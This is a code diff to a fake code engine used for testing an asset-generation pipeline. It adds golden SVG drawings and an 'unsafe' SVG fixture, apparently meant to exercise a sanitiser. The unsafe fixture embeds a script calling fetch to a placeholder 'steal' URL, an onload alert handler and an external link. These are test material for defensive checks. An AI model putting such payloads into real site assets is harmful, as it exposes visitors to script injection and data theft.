@@ -40,6 +40,10 @@ class FakeStep(BaseModel):
     plant_component_defect: bool = False
     # Spec drafts (Stories 2.4, 12.4): write the example spec(s) matching the requirement in `.bga/` (DRAFT_FIXTURES).
     draft_fixture: bool = False
+    # Site images (Story 15.2): draw the SVGs `.bga/assets.json` asks for, from `GOLDEN_ASSETS` (a simple generic
+    # drawing for any other id); `unsafe_assets` plants a script, an external link and a hex colour in each (15.3).
+    golden_assets: bool = False
+    unsafe_assets: bool = False
     delete: list[str] = []
     sleep_s: float = 0
     crash: bool = False
@@ -83,6 +87,40 @@ export default function {name}({{ title, children }}: {name}Props) {{
   );
 }}
 """
+
+
+# TESTING / DEMO ONLY: hand-drawn SVGs for the generated assets of the examples (static-landing, project-tracker).
+GOLDEN_ASSETS = GOLDEN.parent / "assets"
+GENERIC_ASSET = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="{view_box}">
+  <rect width="100%" height="100%" fill="var(--muted)" />
+  <circle cx="30%" cy="45%" r="18%" fill="var(--primary)" opacity="0.85" />
+  <rect x="48%" y="30%" width="34%" height="40%" rx="4%" fill="var(--accent)" />
+</svg>
+"""
+UNSAFE_ASSET = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  viewBox="{view_box}">
+  <script>fetch("https://example.com/steal")</script>
+  <rect width="100%" height="100%" fill="#ff00ff" onload="alert(1)" />
+  <use xlink:href="https://example.com/sprite.svg#icon" />
+</svg>
+"""
+
+
+def write_assets(workdir: Path, unsafe: bool) -> list[str]:
+    """The SVGs the orchestrator asked for in `.bga/assets.json` (frontend_assets.py)."""
+    request = json.loads((workdir / ".bga" / "assets.json").read_text())
+    written = []
+    for asset in request["assets"]:
+        golden = GOLDEN_ASSETS / f"{asset['id']}.svg"
+        if unsafe:
+            text = UNSAFE_ASSET.format(view_box=asset["viewBox"])
+        else:
+            text = golden.read_text() if golden.is_file() else GENERIC_ASSET.format(view_box=asset["viewBox"])
+        target = ensure_inside(workdir / asset["file"], workdir)
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(text)
+        written.append(asset["file"])
+    return written
 
 
 def write_custom_component(workdir: Path, defect: bool) -> str:
@@ -229,6 +267,8 @@ def demo_scenario(delay_s: float = 0.3) -> dict[str, list[FakeStep]]:
         "repair_frontend": [
             FakeStep(sleep_s=delay_s, golden_frontend=True, message="Replaced the hard-coded colour with a token."),
         ],
+        # Site images (Story 15.2): the golden drawings, one call for all of a job's generated assets.
+        "generate_assets": [FakeStep(sleep_s=delay_s, golden_assets=True, message="Drew the illustrations.")],
         # Spec drafts (Stories 2.4, 12.4): the example spec(s) the requirement matches; nothing to repair.
         "draft_spec": [FakeStep(sleep_s=delay_s, draft_fixture=True, message="Drafted the spec.")],
         "draft_frontend_spec": [FakeStep(sleep_s=delay_s, draft_fixture=True, message="Drafted the specs.")],
@@ -330,6 +370,10 @@ class FakeEngine(ICodeEngine):
                     shell.write_text(shell.read_text().replace('className="', f'className="{PLANTED_COLOR}', 1))
                 if step.draft_fixture:
                     for relative in write_draft_fixture(workdir):
+                        await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
+                        tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
+                if step.golden_assets or step.unsafe_assets:
+                    for relative in write_assets(workdir, step.unsafe_assets):
                         await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
                         tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
                 if step.custom_component or step.plant_component_defect:
